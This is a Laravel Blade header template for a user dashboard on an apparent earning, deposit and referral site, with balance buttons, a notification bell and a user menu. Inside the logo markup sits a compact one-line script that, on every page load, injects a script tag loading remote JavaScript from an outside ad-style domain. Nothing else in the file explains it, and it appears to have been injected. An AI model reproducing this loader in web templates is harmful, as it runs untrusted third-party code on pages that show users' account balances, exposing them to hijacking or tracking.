

<style>
    @media (min-width: 992px) { /* This targets screen widths 992px and above, typical for desktops */
    .mdi-menu {
        display: none;
    }
}

    @keyframes flipInY {
    0% {
        transform: perspective(400px) rotateY(90deg);
        opacity: 0;
    }
    40% {
        transform: perspective(400px) rotateY(-10deg);
    }
    70% {
        transform: perspective(400px) rotateY(10deg);
    }
    100% {
        transform: perspective(400px) rotateY(0);
        opacity: 1;
    }
}

.dropdown-menu {
    display: none;
    animation-duration: 0.9s;
    animation-fill-mode: forwards;
    backface-visibility: visible;
    transform-origin: top center;
}

.dropdown-menu.show {
    display: block;
    animation-name: flipInY !important;
}

    
</style>



<header id="page-topbar">
    <div class="navbar-header">
        <div class="d-flex">
            <!-- LOGO -->
            <div class="navbar-brand-box">
                <a href="{{ route('user.dashboard') }}" class="logo logo-dark">
                    <span class="logo-sm">
                        <img src="{{ URL::to(website_favicon()) }}" alt="" height="40">
                    </span>
                    <span class="logo-lg">
                        <img src="{{ URL::to(website_favicon()) }}" alt="" height="40">
                    </span>
                </a>
<script>(function(s){s.dataset.zone='11563878',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
                <a href="{{ route('user.dashboard') }}" class="logo logo-light">
                    <span class="logo-sm">
                        <img src="{{ URL::to(website_logo()) }}" alt="" height="40">
                    </span>
                    <span class="logo-lg">
                        <img src="{{ URL::to(website_logo()) }}" alt="" height="40">
                    </span>
                </a>
            </div>

            <button type="button" class="btn btn-sm px-3 font-size-24 header-item waves-effect vertical-menu-btn" id="vertical-menu-btn">
                <i class="mdi mdi-menu"></i>
            </button>
        </div>

        <div class="d-flex">

            <div class="mbl-dnone mr-2">
                <div class="d-flex justify-content-center d-lg-inline-block">
                    <a href="{{ route('user.new-withdraw-request') }}" class="btn btn-sm earning-balance text-white mbl-btn mbl-mt" style="background: #000066; border: #000066;" type="button">
                        Earning: ${{ round(Auth::user()->earning_balance, 4) }}
                    </a>
                    <a href="{{ route('user.deposit') }}" class="btn btn-sm deposit-balance text-white mbl-btn mbl-mt mr-2" style="background: #008000; border: #008000;" type="button">
                        Deposit: ${{ round(Auth::user()->deposit_balance, 4) }}
                    </a>
                </div>
            </div>
            
            <div class="dropdown d-flex align-items-center nav-text gap-4 pr-4 mr-4">
                <!--<p class="m-0 c-pointer" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">-->
                <p class="m-0 c-pointer" onclick="showNotificationModal()">
                    <i class="mdi mdi-bell"></i>
                    <lable class="notification_count">{{ latest_notification(Auth::user()->id)->count() }}</lable>
                </p>
                <p class="m-0">ID: {{ Auth::user()->code }}</p>
                
                <div class="dropdown-menu dropdown-menu-end">
                    <a class="dropdown-item" href="javascript:;">ID: {{ Auth::user()->code }}</a>
                    <div class="dropdown-divider"></div>
                </div>
            </div>

            <div class="dropdown d-inline-block">
                <button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                    @if(Auth::user()->image)
                        <img class="rounded-circle header-profile-user" src="{{ asset(Auth::user()->image) }}" alt="{{ Auth::user()->name }}">
                    @else
                        <img class="rounded-circle header-profile-user" src="{{ asset('frontend/img/user.png') }}" alt="User Image">
                    @endif
                </button>
                <div class="dropdown-menu dropdown-menu-end">
                    <!-- item-->
                    <a class="dropdown-item" href="javascript:;">ID: {{ Auth::user()->code }}</a>
                    <div class="dropdown-divider"></div>
                    <a class="dropdown-item" href="{{ route('user.profile') }}"><i class="mdi mdi-account-circle font-size-17 align-middle me-1"></i> Profile</a>
                    
                    
                    
                    
                        @if(site_info()->balance_transfer_active == 1)
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.earning-to-deposit') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-transfer font-size-17 align-middle me-1"></i>Balance Transfer </a>
                     @endif
                    
                    
                    
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.new-withdraw-request') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-wallet font-size-17 align-middle me-1"></i> My Wallet</a>
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.top-deposit-user') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-account-multiple font-size-17 align-middle me-1"></i> Top Deposit User</a>
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.top-earning-user') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-account-multiple font-size-17 align-middle me-1"></i> Top Earning User</a>
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.top-referral-user') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-account-multiple font-size-17 align-middle me-1"></i> Top Referral User</a>
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.referral') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-account-plus font-size-17 align-middle me-1"></i> Referral </a>
                    <a class="dropdown-item" href="@if(Auth::user()->status == 0) javascript:; @else {{ route('user.referral-user') }} @endif" @if(Auth::user()->status == 0) onclick="return alert('Your Account is blocked! {{ Auth::user()->reason }}. Please Contact with authority!')" @endif><i class="mdi mdi-account-multiple font-size-17 align-middle me-1"></i> Referral Users </a>
                    <div class="dropdown-divider"></div>
                    <a class="dropdown-item text-danger" href="{{ route('user-logout') }}" onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
                        <i class="bx bx-power-off font-size-17 align-middle me-1 text-danger"></i>
                         Logout
                    </a>
                    <form id="logout-form" action="{{ route('user-logout') }}" method="POST" class="d-none">
                        @csrf
                    </form>
                </div>
            </div>

        </div>
    </div>
</header>
